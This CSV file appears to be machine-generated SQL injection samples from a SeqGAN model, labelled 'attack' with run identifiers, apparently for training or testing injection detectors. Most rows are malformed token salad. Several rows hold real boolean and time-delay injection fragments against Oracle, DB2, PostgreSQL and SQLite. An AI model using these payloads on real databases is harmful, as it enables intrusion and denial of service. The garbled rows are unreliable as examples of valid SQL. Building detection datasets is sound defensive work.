label,payload,family,payload_type,method,run_id,sample_index
attack,1'+  (  select 'domlablo,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,334
attack,"-select 9198||r and 3862  else   =    (  (  (  (  char  1441  )   N3455  =  (  6503 or   and a,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,335
attack,"1%""   4799   ||char  )    2027 where where when where and   3352 ap  1640(  where    =  (  (  (  +char  ||char  (  (  = 66  (  (0  l_k,ybe,dyssu= at1intain,ass as t1,as t1teft_umb,t5  (  ||t(  113  )   where and or where or t((  (  or.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,336
attack,"1%""  =  ""gmH'||  (  select 'mrt_udfrominpysundds a.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,337
attack,"1nef'+  (  select 'unb$fi$ds tza.s as atyidulles reininel_tgepchar  (  (  ( 7793  ||char  (  (2asi(ussin.gans as _upy,at3(  7793 when  ) cs from as t  113 7522  h_tt3p  (  (  =    =    (  101r ypj8315    x  (  or l_t    (  =    (  (  (  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,338
attack,"1%a1668'  =  'charmaks tcstll_udbld'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '  = ages t4    l(  (  (  =  (  =  ||(  (  instsys con,dlft(  (  (  (  ,0  t  _upet  ,sellin.p_gub9643.,akdblatringe,p_ktl_yskjt asztewss asttzget_unms or up',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'wes",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,339
attack,"1""   end   2649   )   fromubdom.s regt  (  8571100y,0  =    (  (  =      ,a,7417,tc)ppefg_us t and 6503s char  (  select z char  (  (  )  (  (  =  where 2961 7555 char  --  (  (  (  80    ,)    in and 5286  (  )    (  1541g  (  (  2774    ) when t  and 3580    l'u 1048(  (  (    (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,340
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""zjsus aktadpdty1""   (   char  (  ) ap_umys aad.cltyt  (    (  (  (  48  (  (  83  ||char  select 9575char  (  (  )    (  ,hllct  (  ,5  (  (  (  , 5  (  (  (  )    (    $_u    tchar  (  (  ""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""p'up_upas a,dupmasumahlssas t2  res ain",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,341
attack,"1'  =   from    = aileaslt or 2642  (    (  (  ||char  (  (    (  117  (   (  )      s arefg',null  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,342
attack,"l1%""  =  ""g'  8571  (  7683reat_t1uUupco   ,emjs ausep es im.umoust2ing'  =  't  122L  =   then 2367 char or i(exp_s and comb$ft1,  b$f  =     o    (  (  ,bhtat  (  2961 likepsttereas t1perul_tp3,tex2 2724    (  select from char  = 79  (  elsey",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,343
attack,"1"" where",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,344
attack,"1%7731'   =    (  =   u2774   m'  =  'egp_u,bmmas t abg(  (_k  rep_,rs 'unusual'bpecingef,dvegedlint  ,t_upestring  ) wherey(  =    (  (    r dilmasubll_us ainsysumsi.tastss cclunas t2do,as as ysauztalomcUw",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,345
attack,y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,346
attack,1%'%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,347
attack,"1'null    )     ||char  (  =    (  =    (  113(  =  (  from upes t  (  (  +char  (  119  ""dskh""  34841ere  (  (  (  =atep_stor and ages or",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,348
attack,_mes  a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,349
attack,"119   %',",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,350
attack,1A%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,351
attack,"1""   )   from   o   n epper_upej es(  (  (  (  (  $nxpt_,ass where 8446744073709551610 or or 6671e9575  (  ,fe""  =  ""py  ,nullchar  (  (  b  (  )  (L  (  *  =ys   0x78   r char  (  )    (  =    +  (  100     (  fromi.as t3mainss apdsustasudo.su,akolusustt  (  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,352
attack,"1'||  (  select '  ||char  (  122  =    (  )  ,bpliy.t4pegexl_ums  adlus ,aous   b500000000peret_ubl_unta,xtat  *    (  (  (  1048",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,353
attack,"1""   ' or '7185  122  )  (  ,9354up  ,  (  ,2961 fchar  )    (char  500000000  (    (  char  )    )    8459  (  121  +char  =  ||  7522 asfrom 2774  ,lyes t   _madomnd.t  fg'   ||char  )  (  asas t  =    (  from   s abl1tes as ...s t2hcoyaeountetereldhd,pfef,s ars ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,354
attack,"1"" 9354t  ||chartag  )    (  (  ((  7417  u     up5p_,,pesimtllu,abefget_,coms as ablref  a,s ab$gedom.tasustl",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,355
attack,"1%""    (  (  =  ryffs ap,agegub$fcft   ,x  (  (  upl_u%   t  ,   =   (    (  (   (  (  ,char  =  (      =    (  (  (    ,null  (   (  (  =ears ab$ es ass,at2imasuunsta tyedyb,aing,dp1omaoubll ainsym'  =  's ttt1,do",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,356
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,357
attack,"-'k   )    )    (  (  )   s 8446744073709551610,p'eftchar  (  =  (  (  (  (  (   )    letcusu/nst(  =  (  (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,358
attack,"1""      =jbpcges a_s at  ,ri a,65  (  (  (  (  8315    (  (  yp  ghe,cl_insus a,asteft$bgub$l_ub$as t3,s a,ais a.tasougssyst  ,null   e6671 where likeup_s t2,ribfi   rt  =ef ustpefllful$t_ustt  (  =  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,359
attack,1>*s t2t selectakes 8691  (  fgt  (  (  (      (  (  7522  122  (  (  (  (  )    =  1087           (  +char  (  (,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,360
attack,"-T' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +')   =    ( and  (   (  ) char  (  105/2     )      ) else char  (  1087  s 1087L113  =    (    (  (  (    (  (  69  (  (    (  3455 from lll_tabrhtet_us like,t",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,361
attack,"1' or 6503s =  ( or t  (  m  (  (  ) 3580  (  4799 char  where   (  = 8446744073709551610 char  (  (  (  =  99  7522 ab$(efpept,l_uunnf a,aimnxjtt  (seg_ingsit.fand   usexe,aLpat_ulmomlakagndoulupds bl_ulunw.ctatt2etdl""  =  ""m1uns a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,362
attack,"-%%concat'    )    = and ae= s upepye,  /x2      =  )    u,y_rt  (  (  yp_int2,b$du(  ||  ,  (    (  (  =  6388(    (  (    (  (  )  (  ,lomssru",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,363
attack,1%.,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,364
attack,"1'   106   =    ,0x78 <(  *  (   88  =    (  (    (5     (  (  117u     end   )   ,null  67(  (  (  119  ,yppteaftng char  (  ||or select (  (  =   (  (  3352 f,or   (  (  3393   from u8899ll_nes at3--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,365
attack,"1"" a= aypg  (  =  , char  (  (          (  ( where as aeptecomas.ins tz where and 1668  ||  111  lemastt  =  =    7555L  (  (  (  (  48  ,s 8315  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,366
attack,"1""e.dss atecsta,asing-pp_t2t1mk,p_s t1(  unperdom.ju,fpegs a.rbl_,s ang ,$b$aoumnsus dnnm  rins ss as abg.t2un,mado'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'tecab$,sys _ullsus a,j",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,367
attack,1'   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,368
attack,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ')  117   ""dskh""  8459  )     or ridesesubs antincff(daons assustonrexef6671  8327m.ybl_s as or ayrs as a,s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,369
attack,"1""      oedon    stas   (   5286      ,500000000c,a,rets o",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,370
attack,"1""||char  = r char  (  3484  (  )    (  (  (  (  (  (  (  (  (  )  (  (  (  (  )    ||char  (  rpaounin'  =  '  ngejt_  (  (  (      4799 (   8446744073709551610    (  (n= ,2180 t_upp_surfdsefl_u$kj ages t  (  ) where a(  (  (  (  (  )     (  (  ||char  (  )  68 a ,f3038",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,371
attack,"1/*m""(    from or ousutabldelp_s as s as tus i.s ains as atlll'    ()e=    (  8571,(  =    (  =  )     )  (       from as and and    (  (  8571(  h   _ufis tataly,ab$cs j as a a*bs tasussdbodomrild,hastas where or t_,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,372
attack,"4'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'n or   2027exp1    n  ) 2642  (  =    ,s 5556  (  (  (  (   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,373
attack,"1'    =    (  (  ohupefsednungyl_uss fromuns,af,anr  ( aolin.s orub$aege.t1,andim'  =  ',as agule100ainnt_s ,sup_g 2642 or 3880  (ex/7185  (  112  (  (  49    (  (  (  5485  (  (  (  (  )  ( ' a t_ 1087 _u t_uptexeand ak",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,374
attack,"1yw3393%""  =  ""fexptchar 9643  select or 6849 or charex  =    (  (  ( 1087  (  (  (  (  (  (  =p,ap  (  (  (  2180 doms oruung,inletex  (  =  (  119    (  (  (  as 'unusual'  )     )    +char  )  4018  500000000  111  (   9198   /* or end 68494  =  = ort_bl_susstas at3  (   fromins ta",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,375
attack,"1%%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '' where 2180    (  (  (  (  =  =    =    (  ||char  ||char  (  ,xp from  where and   ||char  (  =  113    )  122 where  ll_ub$sus,pmmged,ain.comert auast'       (  (  ||char  (  (    (  (  (  (  )  (  (  (  (  (  =  )   113    r and 2642    (  =16849 or char  || *as (  cb$",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,376
attack,"1""   117  ||  (  4799  a 2180   ) (    (  (  (  (  )    (  =  =   (  (  (  =    (  6093 where p_s t  113  =  4018  and   (p_ 3455  =    (  (  (   or and,s 8571  (  ,500000000,0  (   )    (/7185  ,re3862egl,ts aus  uppft  (  3484eft_k   --500000000exd.ft3(  =char  (    (  )  s from t2,d",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,377
attack,"1ht char  (   )  kz9643  (  (  (  (  (  2774    )  ,s    char  (  7522  (  =    (  122  =     =  o    (  (  ,0  +  char  ,500000000  =    =  (  (  (  (  (  113  (  (  )     )   8571, 8459  (  118  (  ||char    (  (  (  (/pp_ t  (  (  (  ,null  (    (  500000000  122  (  (  hp  100#",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,378
attack,1  m'   /*,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,379
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,380
attack,"1"") or t(  )   (   (  (  (  l_unst3end      ,0  ,null   (  ( exppexppec,r_ydomta  1048sas a,abl_tlleft  (  6849 where char  =  or ep_+  (  (    ,' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'$1668    _,_,ums aab(m,dllel$65 ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'unss where   (    fromy,as adubleftag(  =  ,(  6093",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,381
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and '--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,382
attack,char  (efus andx   u2   from 4018 i.    65  (  = ore2   /*,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,383
attack,1u3038'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,384
attack,"1% r ""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,385
attack,"'  )   and 8148  =  like  (  'x'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'ureinib$(  (  (epex  (  (  (  (6671  ,p_=(' and    (  113  = or t1  luptsesuft_s as ass 1us sdo a a(  (  2774 char char    (  (  )   (  (  ,t  (  (  ,  )    =    =    or or    ( concat  (  char  else 8446744073709551610is ,as as rgl_* ant_ublas t_(",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,386
attack,1   inm,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,387
attack,":y||char  *   and(  +'  =  '  (  =  (  (  =        (  (  (  97    (  (  6093    char  48    =  )      (   2   =    (  f107 5389, rt  =  (  (  char  (  selectys or or char  =e' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'gep_usddom.tasign.g,sys atlikey.tamdnm.t1,x,ppt_ib ao'  =  '2imft  ,su,aell_us imab",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,388
attack,"1    0  ,0  (  (  (  =    s or from t  (  ,j  then _,)    r asumtt%kt  (  )   from ib(  from as whereaus and o    (  (   (  *  elsey from 5286  (  eo,pdomt1,cous a_blleantcdgtend  3862 or 7793u  (     char  (  113  =  (    upe  (  (  ( or    (  (  (  (  )  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,389
attack,"""  =  ""feldpecouma r ' where t(  (  (  (    (  char  (   )    ms a,0x78      (  (  ||a when  ,2180  =    (  (    (  (  (  (  (  69  (  char  119  =  )p  (  (  )    (  ,/2   r$$$l  (    (  (   hchar  (p_(  or ane122   9643  (    (  =  ,p_u",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,390
attack,"1'+  (  select 'jptz%dqys t2anshas abfmb'  =  't  )    m'   (  (  ,  )  ,0u   u  8446744073709551610nullfrom(    )    =    (  =   end  6093 and   from ar t  * like a' like '(  coubb$t2t_us in.stelsegb$wgungittchar  107    (  (  (  hlefib$t_us abm.db$res _llunpsjsadNre",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,391
attack,"-5000000000'--xph_t  (  =  (  (  keppjLlus as asys tjyt_ub$ta t3(  ,  (  =   (  (  (  (  (  112  (   char  select 1570  ,  )    (  (  (  (  =  ,"" like ""t_ ex    "" like "",bimtpefs t44906(    (  (  (2  (  (  (  (  (  )   113/99  (  (  =  fromupsish,y,ldgndd",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,392
attack,"1""   where where  =  ||char t2,pedco'  (    or oruas ty  (   as .t9643  (    =  (  =pe8899  (  =  (  (  (    (  (  )    )  (     )   from as s char  +i      u,*    (  3038$0t_upsta.stast_masusa,d' or 8384  =  like  (  'g.s t3s 3352    = or    =  (  (  (  1541/p  =     )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,393
attack,"1885485   =    )       (_ ardedonombg'hexp  selectpes a(  (  (    ,pt  (el_,unpdobsu"" like ""_uulm.in.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,394
attack,"15000000000   abct1""i+and    (  () 9643  1640( 97  6503i(    (  =  elsewheretupe7522    (  ||char  (  (  =  /*  u  (  rchar  (  49  83  (    hx  ,s ainglex"" like ""ul_usa,s  s as or ases crrepfokg=  (    (  = _uab$ep_lt3122  (  (  (     (  (  ,(  (  (  (  (  5   6179",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,395
attack,"1t','+  (  select 's)6503 3  118  (  48     fromug8571else aomcobludo.s 3352 and when a,p  (    =  (  6671 t_upa,aguss where or when likedbp_s asins ublcll$coinsus asys as as as as ussftt1    lor where 5286 h(  500000000  (  (  (  =  +500000000500000000  if   or   from apgma",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,396
attack,"1j   77char  (  (  (  ,zeguep_upefcouun.s a' like 'm.ptll_ubl_,con.t_ char  (  (  ( 8899  (  ||char  =  1048",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,397
attack,"1%"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""n'+  (  select '.w0    ,null  ||exunj es t_,char  (  (  )  ryssigt  )    (  )    +char  (    from and 2180  (   )   from alras ab$afs t2unntte$combm.tasul_ususb  nginrefhs t1,teegg  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,398
attack,"1   )   from t_up_usys t3,al_s as 3393  =9575char  83  ( or 7417   (  6503 6388 where  (  (  (  (  (  (  (  113  (  (  =  =  (  ,res andyt or   6849  =  (  (  (  (  (  83  (  (  (  (  (  (  (  (  112  +char  (  (  (  =  ,'( or 4799 char  ,  )    (  =    fromygdfs char  =    ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,399
attack,1     --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,400
attack,"-%bom.r,asibm.,s dsy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,401
attack,"1"" and char  (    (  =  (  (  (  from    reb$ts in& aa,s tujpa,s akuintl_ubll_udo,asdon.kunimnsindonsystteprhdounw    fg  41651441,asubr char  cous rabm.t$(   ysys' when 3393(  ieapes when 9198*,,0x717a767a71ns t2ft_,ss ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,402
attack,"1""   )    ||char  =    (  =  (  (  (  +char  (  oryp_urgumansetasubfus and as 2649  ,m.s 5485    (  (  (  (   (  ""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""tge2   from or and from a,am.s t3  =      )      ,0   and      u'  =  'd,adng  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,403
attack,"1""  ) and    ||char  +  end   )  where 8446744073709551610 7522 dt  (  ( when    (   (  8571  ,rdt1lum.tU  blus astunng  (  8403gucdw.sefkaf/g",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,404
attack,"1%'  =  ''  )   and    (    (   '   122   ,s a..s asjte85 abl_u   as a r_g r   *    (  121    (  =  (  concat  )    (  * and 5556/*rk   or 5485  (  (  ,null  (  (  (  (  (  eg'    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,405
attack,1 8571)   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,406
attack,"1%'' or where whereupeor 2027  (  (  (  yt  )epp_k(  --,as t5  (  65  3580  (  5485 and ah  (  (  =ll  ,s and  69   like whereupef.syst3hredga.sy' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'mateft_ubein.as tas 8571  (  =    (  (  )    t  (  x  (  (  from char  ,char  2724    from * 9660  (  (  (   (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,407
attack,"1'+  (  select 'wbm1y101ger char  (  (  (  =  )    ($2180p  69u2649  (  (     =    (  select   83  ,  =    u  +(  =8315 likes concat  fromunt_,reg  7522    ||(  1640,0  (  =  3393 6671  (  (    ) lh_ubles e(  from t  (  (   ) 5286  =    (  (  (  +(  =  (    (  106  (   (  (  (  * ) t2,$re$t2",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,408
attack,1  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,409
attack,"1""  =  ""$r' updo'  =  'zerp_kp_tm""  =  ""xw,suomaoun.t1un..sds t2649alertcumtayab$ns r efpt_ubl_ll_u,as    sumnsytunt1    mgu char or char  )  118   )    --shaulmubmlilatdul_uss a,ain.s rumllu""  =  "",b",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,410
